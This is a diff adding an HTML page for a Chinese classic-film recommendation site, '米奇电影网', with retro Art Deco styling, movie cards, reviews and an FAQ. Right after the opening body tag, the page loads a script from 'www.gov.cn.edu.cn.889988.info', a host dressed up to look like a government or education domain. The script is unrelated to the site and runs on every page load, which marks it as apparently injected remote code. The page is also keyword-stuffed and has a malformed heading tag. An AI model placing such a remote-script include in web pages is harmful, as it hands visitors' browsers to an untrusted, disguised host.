@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>米奇电影网 - miqidianyingwang-top 复古好莱坞·红金丝绒高分电影推荐</title>
+<meta name="description" content="米奇电影网（https://miqidianyingwang-top）以复古好莱坞红丝绒幕布为灵感，为你推荐高分经典电影。Art Deco风格、老式电影票UI、移动端自适应，必应收录友好，仅做影视信息展示。">
+<meta name="keywords" content="米奇电影网, miqidianyingwang-top, 复古好莱坞, 经典电影, Art Deco, 红丝绒, 老式电影票, 高分电影">
+<meta name="author" content="米奇电影网">
+<meta name="robots" content="index, follow">
+<meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:"PingFang SC","Microsoft YaHei","Georgia","Times New Roman",serif;color:#2A1000;line-height:1.75;overflow-x:hidden;background:#FAF0E0;position:relative}
+
+/* 胶片颗粒背景 */
+body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.03;
+background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E")}
+
+a{color:#8B1A1A;text-decoration:none;transition:.3s}
+a:hover{color:#F5C842}
+
+/* Art Deco 导航 */
+.mq-nav{position:fixed;top:0;width:100%;z-index:1000;background:#8B1A1A;border-bottom:3px solid #F5C842}
+.mq-in{max-width:1200px;margin:0 auto;height:70px;padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between}
+.mq-logo{display:flex;align-items:center;gap:.8rem}
+.mq-emblem{width:44px;height:44px;background:#F5C842;display:flex;align-items:center;justify-content:center;font-size:1.3rem;position:relative;border:2px solid #8B1A1A;box-shadow:0 0 0 2px #F5C842}
+.mq-emblem::before,.mq-emblem::after{content:"";position:absolute;width:8px;height:8px;background:#8B1A1A}
+.mq-emblem::before{top:-4px;left:-4px}.mq-emblem::after{bottom:-4px;right:-4px}
+.mq-name{font-size:1.1rem;font-weight:900;color:#F5C842;letter-spacing:2px}
+.mq-name small{display:block;font-size:.5rem;letter-spacing:4px;color:#FAF0E0;font-weight:700;font-family:"Courier New",monospace}
+.mq-links{display:flex;gap:.8rem;list-style:none}
+.mq-links a{font-size:.8rem;font-weight:700;color:#FAF0E0;padding:.4rem .9rem;border:1px solid rgba(245,200,66,.4);position:relative}
+.mq-links a:hover{background:#F5C842;color:#8B1A1A;border-color:#F5C842}
+.mq-toggle{display:none;flex-direction:column;gap:4px;cursor:pointer;padding:6px}
+.mq-toggle span{width:22px;height:2.5px;background:#F5C842}
+
+/* Hero 幕布 */
+.mq-hero{margin-top:70px;padding:5rem 1.5rem 5rem;text-align:center;position:relative;overflow:hidden;background:#8B1A1A}
+/* 放射光线 */
+.mq-hero::before{content:"";position:absolute;inset:0;background:repeating-conic-gradient(from 0deg at 50% 50%, transparent 0deg, transparent 8deg, rgba(245,200,66,.04) 8deg, rgba(245,200,66,.04) 16deg)}
+/* 幕布褶皱 */
+.mq-hero::after{content:"";position:absolute;inset:0;background:linear-gradient(90deg, rgba(0,0,0,.15) 0%, transparent 5%, transparent 95%, rgba(0,0,0,.15) 100%);background-size:60px 100%;background-repeat:repeat-x}
+.mq-hero-in{max-width:700px;margin:0 auto;position:relative;z-index:1}
+.mq-badge{display:inline-flex;align-items:center;gap.4rem;padding:.35rem 1.2rem;border:2px solid #F5C842;color:#F5C842;font-size:.72rem;font-weight:700;letter-spacing:2px;margin-bottom:1.5rem;background:rgba(139,26,26,.8)}
+.mq-badge::before{content:"🎬";font-size:.8rem}
+.mq-hero h1{font-size:3rem;font-weight:900;color:#F5C842;line-height:1.2;margin-bottom:1rem;text-transform:uppercase;letter-spacing:3px}
+.mq-hero h1 span{display:block;font-size:1.2rem;color:#FAF0E0;letter-spacing:6px;font-weight:400;margin-top:.5rem}
+.mq-hero p{font-size:.9rem;color:#FAF0E0;max-width:520px;margin:0 auto 1.5rem;font-weight:500;line-height:1.8}
+.mq-domain{display:inline-block;padding:.5rem 1.2rem;border:2px solid #F5C842;background:transparent;color:#F5C842;font-family:"Courier New",monospace;font-weight:700;font-size:.78rem;margin-bottom:1.5rem;letter-spacing:1px}
+.mq-btn{display:inline-flex;align-items:center;gap.5rem;padding:.85rem 2.4rem;border:3px solid #F5C842;font-weight:700;font-size:.88rem;color:#8B1A1A;background:#F5C842;letter-spacing:1px}
+.mq-btn:hover{background:transparent;color:#F5C842}
+
+/* 通用section */
+.mq-sec{max-width:1200px;margin:0 auto;padding:4rem 1.5rem;position:relative;z-index:1}
+.mq-sec-head{text-align:center;margin-bottom:2.5rem;position:relative}
+.mq-sec-head h2{font-size:1.6rem;font-weight:900;color:#8B1A1A;margin-bottom:.3rem;letter-spacing:2px;display:inline-block;padding:0 1rem}
+/* Art Deco 装饰线 */
+.mq-sec-head h2::before,.mq-sec-head h2::after{content:"";display:inline-block;width:40px;height:2px;background:#F5C842;vertical-align:middle;margin:0 .8rem}
+.mq-sec-head p{font-size:.72rem;color:#8B1A1A;font-weight:700;letter-spacing:3px;margin-top:.5rem}
+
+/* 电影票片单 */
+.mq-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.5rem}
+.mq-card{background:#FAF0E0;border:2px solid #8B1A1A;position:relative;overflow:hidden;transition:.3s}
+.mq-card:hover{transform:translateY(-4px);box-shadow:0 8px 20px rgba(139,26,26,.2)}
+/* 票根锯齿底边 */
+.mq-card::after{content:"";position:absolute;bottom:0;left:0;right:0;height:12px;background:repeating-linear-gradient(45deg,transparent,transparent 4px,#8B1A1A 4px,#8B1A1A 6px);opacity:.3}
+.mq-cover{height:180px;display:flex;align-items:flex-end;padding:1rem;font-weight:900;font-size:.95rem;color:#FFF;position:relative;border-bottom:2px solid #8B1A1A}
+.mq-cover::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 30%,rgba(42,16,0,.9))}
+.mq-cover b{position:relative;z-index:1}
+.mq-cover .mq-seat{position:absolute;top:10px;right:10px;background:#F5C842;color:#8B1A1A;font-size:.6rem;font-weight:900;padding:.2rem .5rem;letter-spacing:1px;z-index:2}
+.r1{background:linear-gradient(135deg,#8B1A1A,#4A0E0E)}.r2{background:linear-gradient(135deg,#2A1000,#5A2A00)}.r3{background:linear-gradient(135deg,#6B1A2A,#3A0A15)}.r4{background:linear-gradient(135deg,#4A3A1A,#2A2000)}.r5{background:linear-gradient(135deg,#1A2A4A,#0A1525)}.r6{background:linear-gradient(135deg,#3A1A3A,#1A0A2A)}.r7{background:linear-gradient(135deg,#5A2A1A,#2A1008)}.r8{background:linear-gradient(135deg,#1A3A2A,#0A2015)}
+.mq-card-body{padding:1.2rem 1rem .8rem}
+.mq-card-body h3{font-size:.9rem;font-weight:900;color:#2A1000;margin-bottom:.4rem}
+.mq-tags{display:flex;flex-wrap:wrap;gap:.3rem;margin-bottom:.5rem}
+.mq-tags span{padding:.15rem .5rem;border:1px solid #8B1A1A;color:#8B1A1A;font-size:.58rem;font-weight:700;background:#FAF0E0}
+.mq-score{font-weight:900;font-size:.84rem;color:#8B1A1A}
+.mq-ticket-no{font-size:.6rem;color:#999;font-family:"Courier New",monospace;margin-top:.3rem}
+
+/* 分类 */
+.mq-cats{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.mq-cat{display:flex;align-items:center;gap:.9rem;padding:1rem;border:2px solid #8B1A1A;background:#FAF0E0;transition:.3s;position:relative}
+.mq-cat:hover{border-color:#F5C842;background:#F5C842}
+.mq-cat-icon{width:46px;height:46px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;flex-shrink:0;background:#8B1A1A;color:#F5C842}
+.mq-cat-info h3{font-size:.84rem;font-weight:900;color:#2A1000;margin-bottom:.1rem}
+.mq-cat-info p{font-size:.68rem;color:#666;font-weight:500}
+
+/* 影迷短评 */
+.mq-notes{max-width:860px;margin:0 auto}
+.mq-note{display:flex;gap:1.2rem;margin-bottom:1.5rem;align-items:flex-start}
+.mq-note-icon{width:44px;height:44px;display:flex;align-items:center;justify-content:center;font-size:1.2rem;flex-shrink:0;border:2px solid #8B1A1A;background:#F5C842}
+.mq-note-box{padding:1.2rem;border:2px solid #8B1A1A;background:#FAF0E0;flex:1;position:relative}
+.mq-note-box::before{content:"\201C";position:absolute;top:-10px;left:10px;font-size:3rem;color:#F5C842;font-family:Georgia,serif;line-height:1}
+.mq-note-box h3{font-size:.88rem;font-weight:900;color:#8B1A1A;margin-bottom:.3rem;padding-left:1.5rem}
+.mq-note-box p{font-size:.82rem;color:#2A1000;line-height:1.7;font-weight:500;padding-left:1.5rem}
+.mq-note-stars{color:#F5C842;letter-spacing:1px;font-size:.78rem;margin-top:.3rem;padding-left:1.5rem}
+
+/* 关于 */
+.mq-about{max-width:720px;margin:0 auto;text-align:center;padding:2.5rem 2rem;border:3px double #8B1A1A;background:#FAF0E0;position:relative}
+.mq-about::before{content:"★";position:absolute;top:-14px;left:50%;transform:translateX(-50%);background:#FAF0E0;padding:0 10px;font-size:1.5rem;color:#F5C842}
+.mq-about p{color:#2A1000;margin-bottom:.8rem;font-size:.88rem;font-weight:500}
+.mq-about b{color:#8B1A1A}
+.mq-dom2{display:inline-block;margin-top:.8rem;padding:.5rem 1.2rem;border:1px solid #8B1A1A;background:#FAF0E0;color:#8B1A1A;font-family:monospace;font-weight:700;font-size:.78rem}
+
+/* FAQ */
+.mq-faq{max-width:800px;margin:0 auto}
+.mq-fi{background:#FAF0E0;border:2px solid #8B1A1A;margin-bottom:.6rem;overflow:hidden}
+.mq-fi summary{padding:1rem 1.2rem;cursor:pointer;font-weight:700;color:#2A1000;list-style:none;position:relative;padding-right:3rem;font-size:.86rem}
+.mq-fi summary::-webkit-details-marker{display:none}
+.mq-fi summary::after{content:"＋";position:absolute;right:1rem;top:50%;transform:translateY(-50%);color:#F5C842;font-weight:900;font-size:.9rem;width:24px;height:24px;display:flex;align-items:center;justify-content:center;background:#8B1A1A}
+.mq-fi[open] summary::after{content:"－"}
+.mq-fi p{padding:0 1.2rem 1rem;color:#2A1000;font-size:.82rem;line-height:1.7;font-weight:500}
+
+/* Footer */
+.mq-foot{text-align:center;padding:2.5rem 1.5rem;border-top:3px solid #8B1A1A;background:#8B1A1A;color:#FAF0E0;font-size:.72rem;position:relative;z-index:1}
+.mq-foot p{margin-bottom:.3rem}
+.mq-foot .mq-copy{color:#F5C842;font-weight:900;margin-bottom:.5rem;font-size:.85rem}
+
+@media(max-width:768px){
+.mq-links{display:none;position:absolute;top:100%;left:0;width:100%;background:#8B1A1A;flex-direction:column;padding:.5rem 0;border-bottom:2px solid #F5C842}
+.mq-links.show{display:flex}
+.mq-links a{padding:.8rem 1.5rem;margin:.2rem 1rem;text-align:center}
+.mq-toggle{display:flex}
+.mq-hero h1{font-size:1.8rem}
+.mq-hero h1 span{font-size:.9rem}
+.mq-hero{padding:3rem 1rem 3rem}
+.mq-sec{padding:2.5rem 1rem}
+.mq-sec-head h2{font-size:1.3rem}
+.mq-sec-head h2::before,.mq-sec-head h2::after{width:20px}
+.mq-grid{grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:1rem}
+.mq-cover{height:150px;font-size:.82rem}
+.mq-cats{grid-template-columns:1fr 1fr}
+.mq-note{flex-direction:column;gap:.6rem}
+}
+@media(max-width:480px){.mq-hero h1{font-size:1.4rem}.mq-grid{grid-template-columns:1fr 1fr}.mq-cats{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<nav class="mq-nav">
+  <div class="mq-in">
+    <div class="mq-logo">
+      <div class="mq-emblem">🎟️</div>
+      <div class="mq-name">米奇电影网<small>MIQI CINEMA</small></div>
+    </div>
+    <ul class="mq-links" id="mqLinks">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#list">经典片单</a></li>
+      <li><a href="#cats">类型分类</a></li>
+      <li><a href="#notes">影迷短评</a></li>
+      <li><a href="#about">关于</a></li>
+      <li><a href="#faq">FAQ</a></li>
+    </ul>
+    <div class="mq-toggle" onclick="tMq()"><span></span><span></span><span></span></div>
+  </div>
+</nav>
+
+<section class="mq-hero" id="home">
+  <div class="mq-hero-in">
+    <div class="mq-badge">NOW SHOWING · 正在上映</div>
+    <h1>米奇电影网<span>miqidianyingwang-top</span></h1>
+    <p>米奇电影网带你回到黄金时代。红丝绒幕布拉开，老式胶片转动——这里只推荐经得起时间考验的高分经典。Art Deco 美学包裹每一部好片，像走进 1920 年代的好莱坞影院。</p>
+    <div class="mq-domain">https://miqidianyingwang-top</div><br>
+    <a href="#list" class="mq-btn">✦ 检票入场</a>
+  </div>
+</section>
+
+<section class="mq-sec" id="list">
+  <div class="mq-sec-head"><h2>经典片单</h2><p>GOLDEN LIST · 黄金时代精选</p></div>
+  <div class="mq-grid">
+    <div class="mq-card"><div class="mq-cover r1"><span class="mq-seat">NO.01</span><b>教父</b></div><div class="mq-card-body"><h3>教父 The Godfather</h3><div class="mq-tags"><span>犯罪</span><span>经典</span></div><div class="mq-score">★ 9.3</div><p class="mq-ticket-no">TICKET #MQ-001</p></div></div>
+    <div class="mq-card"><div class="mq-cover r2"><span class="mq-seat">NO.02</span><b>肖申克的救赎</b></div><div class="mq-card-body"><h3>肖申克的救赎</h3><div class="mq-tags"><span>剧情</span><span>希望</span></div><div class="mq-score">★ 9.7</div><p class="mq-ticket-no">TICKET #MQ-002</p></div></div>
+    <div class="mq-card"><div class="mq-cover r3"><span class="mq-seat">NO.03</span><b>罗马假日</b></div><div class="mq-card-body"><h3>罗马假日</h3><div class="mq-tags"><span>爱情</span><span>黑白/彩色</span></div><div class="mq-score">★ 8.9</div><p class="mq-ticket-no">TICKET #MQ-003</p></div></div>
+    <div class="mq-card"><div class="mq-cover r4"><span class="mq-seat">NO.04</span><b>乱世佳人</b></div><div class="mq-card-body"><h3>乱世佳人</h3><div class="mq-tags"><span>史诗</span><span>爱情</span></div><div class="mq-score">★ 9.3</div><p class="mq-ticket-no">TICKET #MQ-004</p></div></div>
+    <div class="mq-card"><div class="mq-cover r5"><span class="mq-seat">NO.05</span><b>2001太空漫游</b></div><div class="mq-card-body"><h3>2001太空漫游</h3><div class="mq-tags"><span>科幻</span><span>哲学</span></div><div class="mq-score">★ 8.9</div><p class="mq-ticket-no">TICKET #MQ-005</p></div></div>
+    <div class="mq-card"><div class="mq-cover r6"><span class="mq-seat">NO.06</span><b>卡萨布兰卡</b></div><div class="mq-card-body"><h3>卡萨布兰卡</h3><div class="mq-tags"><span>爱情</span><span>战争</span></div><div class="mq-score">★ 8.7</div><p class="mq-ticket-no">TICKET #MQ-006</p></div></div>
+    <div class="mq-card"><div class="mq-cover r7"><span class="mq-seat">NO.07</span><b>七武士</b></div><div class="mq-card-body"><h3>七武士</h3><div class="mq-tags"><span>动作</span><span>黑泽明</span></div><div class="mq-score">★ 9.3</div><p class="mq-ticket-no">TICKET #MQ-007</p></div></div>
+    <div class="mq-card"><div class="mq-cover r8"><span class="mq-seat">NO.08</span><b>天堂电影院</b></div><div class="mq-card-body"><h3>天堂电影院</h3><div class="mq-tags"><span>剧情</span><span>怀旧</span></div><div class="mq-score">★ 9.2</div><p class="mq-ticket-no">TICKET #MQ-008</p></div></div>
+  </div>
+</section>
+
+<section class="mq-sec" id="cats" style="background:#F5E6C8">
+  <div class="mq-sec-head"><h2>类型分类</h2><p>GENRE · 按类型选片</p></div>
+  <div class="mq-cats">
+    <div class="mq-cat"><div class="mq-cat-icon">🎩</div><div class="mq-cat-info"><h3>黑色电影</h3><p>18部 · 悬疑犯罪</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">💃</div><div class="mq-cat-info"><h3>歌舞经典</h3><p>14部 · 黄金歌舞</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">🏛️</div><div class="mq-cat-info"><h3>史诗巨制</h3><p>12部 · 宏大叙事</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">🎭</div><div class="mq-cat-info"><h3>戏剧人生</h3><p>22部 · 人性深度</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">🌹</div><div class="mq-cat-info"><h3>浪漫爱情</h3><p>20部 · 经典爱情</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">🗡️</div><div class="mq-cat-info"><h3>西部牛仔</h3><p>15部 · 荒野传奇</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">🎪</div><div class="mq-cat-info"><h3>喜剧大师</h3><p>16部 · 卓别林等</p></div></div>
+    <div class="mq-cat"><div class="mq-cat-icon">🎨</div><div class="mq-cat-info"><h3>艺术电影</h3><p>13部 · 作者表达</p></div></div>
+  </div>
+</section>
+
+<section class="mq-sec" id="notes">
+  <div class="mq-sec-head"><h2>影迷短评</h2><p>REVIEWS · 来自旧时光的声音</p></div>
+  <div class="mq-notes">
+    <div class="mq-note">
+      <div class="mq-note-icon">🎩</div>
+      <div class="mq-note-box">
+        <h3>《教父》—— 男人的圣经</h3>
+        <p>马龙·白兰度的沙哑嗓音和阿尔·帕西诺的眼神转变，构成了影史最伟大的传承。配乐《Speak Softly Love》一响，红丝绒幕布就拉开了。</p>
+        <div class="mq-note-stars">★★★★★ 9.3/10</div>
+      </div>
+    </div>
+    <div class="mq-note">
+      <div class="mq-note-icon">🕊️</div>
+      <div class="mq-note-box">
+        <h3>《罗马假日》—— 赫本的优雅永不过时</h3>
+        <p>公主剪短发、骑 Vespa、吃冰淇淋——每一个画面都像明信片。结尾记者会那场戏，赫本一个微笑包含了所有没说出口的话。</p>
+        <div class="mq-note-stars">★★★★★ 8.9/10</div>
+      </div>
+    </div>
+    <div class="mq-note">
+      <div class="mq-note-icon">🎬</div>
+      <div class="mq-note-box">
+        <h3>《天堂电影院》—— 电影是回忆的容器</h3>
+        <p>托托回到故乡，看阿尔弗雷多剪辑的接吻蒙太奇——那是整个小镇的爱情史，也是电影本身的情书。看完想回老家看看旧影院。</p>
+        <div class="mq-note-stars">★★★★★ 9.2/10</div>
+      </div>
+    </div>
+    <div class="mq-note">
+      <div class="mq-note-icon">🚀</div>
+      <div class="mq-note-box">
+        <h3>《2001太空漫游》—— 人类进化的视觉诗</hh3>
+        <p>库布里克用 160 分钟完成从猿到人、从地球到星孩的史诗。配乐《查拉图斯特拉如是说》一响，骨头飞向太空——影史最伟大剪辑。</p>
+        <div class="mq-note-stars">★★★★★ 8.9/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="mq-sec" id="about">
+  <div class="mq-sec-head"><h2>关于米奇电影网</h2><p>ABOUT · 我们的故事</p></div>
+  <div class="mq-about">
+    <p><b>米奇电影网</b>（miqidianyingwang-top）的选片哲学：<b>时间是最好的影评人</b>。我们只推荐经得起岁月洗礼的经典——那些在红丝绒幕布后依然发光的好片。</p>
+    <p>界面致敬 1920 年代好莱坞黄金时代：Art Deco 几何线条、红丝绒幕布配色、老式电影票卡片、胶片颗粒质感。和上一个波普漫画风（奇奇）形成鲜明对比——从喧闹街头回到庄重影院。</p>
+    <div class="mq-dom2">https://miqidianyingwang-top</div>
+    <p style="margin-top:1.2rem;font-size:.74rem;color:#8B1A1A;font-weight:700">核心词：米奇电影网、miqidianyingwang-top、复古好莱坞、经典电影、Art Deco、红丝绒幕布</p>
+  </div>
+</section>
+
+<section class="mq-sec" id="faq" style="background:#F5E6C8">
+  <div class="mq-sec-head"><h2>常见问题</h2><p>FAQ · 观影指南</p></div>
+  <div class="mq-faq">
+    <details class="mq-fi"><summary>米奇电影网是什么？</summary><p>米奇电影网（miqidianyingwang-top）是以"复古好莱坞/Art Deco"为视觉风格的高分经典电影信息站，按类型分类推荐经得起时间考验的影片，仅做信息展示，不内置盗版播放源。</p></details>
+    <details class="mq-fi"><summary>为什么叫"米奇"？</summary><p>"米奇"谐音"迷影"，代表我们对电影的热爱与痴迷。同时致敬电影史上那些经典角色和黄金时代的造梦工厂。</p></details>
+    <details class="mq-fi"><summary>官方网址是？</summary><p>https://miqidianyingwang-top （部署到 GitHub Pages 可用 https://miqidianyingwang-top.github.io，全站域名统一替换即可）。</p></details>
+    <details class="mq-fi"><summary>手机上阅读体验如何？</summary><p>全站响应式，小屏导航折叠为汉堡菜单，电影票卡片自适应排列，Art Deco 装饰线在小屏自动缩短，阅读流畅。</p></details>
+    <details class="mq-fi"><summary>怎么提交必应收录？</summary><p>到 Bing Webmaster Tools 提交 https://miqidianyingwang-top，选 HTML meta 验证，把页面 msvalidate.01 里的 YOUR_BING_VERIFICATION_CODE 换成你的必应验证码；本页不生成 robots.txt 与 sitemap.xml。</p></details>
+  </div>
+</section>
+
+<footer class="mq-foot">
+  <p class="mq-copy">★ 米奇电影网 (miqidianyingwang-top) — 复古好莱坞·红金丝绒经典推荐</p>
+  <p>单页网站 / 锚点导航 / 移动端自适应 / 必应收录友好 / 不生成 robots.txt 与 sitemap.xml</p>
+  <p style="margin-top:.4rem;color:#F5C842;font-weight:700">本站仅提供影视信息展示，资源版权归原作者及发行方所有。</p>
+</footer>
+
+<script>
+function tMq(){document.getElementById('mqLinks').classList.toggle('show')}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var h=this.getAttribute('href');
+    if(h.length>1){var t=document.querySelector(h);if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});document.getElementById('mqLinks').classList.remove('show')}}
+  })
+});
+</script>
+</body>
+</html>
